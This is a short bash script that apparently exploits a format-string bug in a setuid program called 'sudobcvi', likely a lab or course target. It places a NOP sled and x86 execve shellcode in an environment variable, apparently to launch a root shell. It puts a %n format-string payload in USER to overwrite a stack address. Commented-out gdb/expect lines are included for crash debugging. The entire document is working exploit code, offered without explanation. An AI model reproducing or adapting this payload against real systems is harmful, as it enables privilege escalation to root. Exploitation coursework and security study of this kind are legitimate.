#!/bin/bash


export SHELLCODE=$(perl -e 'print "\x90" x 8000, "\x55\x89\xe5\x68\x6c\x6c\x20\x20\x68\x74\x73\x68\x65\x68\x2f\x72\x6f\x6f\x68\x2f\x62\x69\x6e\x31\xc9\x88\x4d\xfe\x31\xc0\xb0\x0b\x8d\x5d\xf0\x31\xc9\x31\xd2\xcd\x80\x00"')

# 0xffffb8cc

export USER=CC$(echo -e '\xcc\xb8\xff\xff''\xcd\xb8\xff\xff''\xce\xb8\xff\xff''\xcf\xb8\xff\xff''%12$n%186x%13$n%45x%14$n%15$n')

#cat >expect-gdb.tcl <<EOE
#spawn gdb --args sudobcvi /dev/null
#send "r\n"
#expect "Segmentation fault"
#send "bt\n"
#interact
#EOE
#expect expect-gdb.tcl

sudobcvi /dev/null
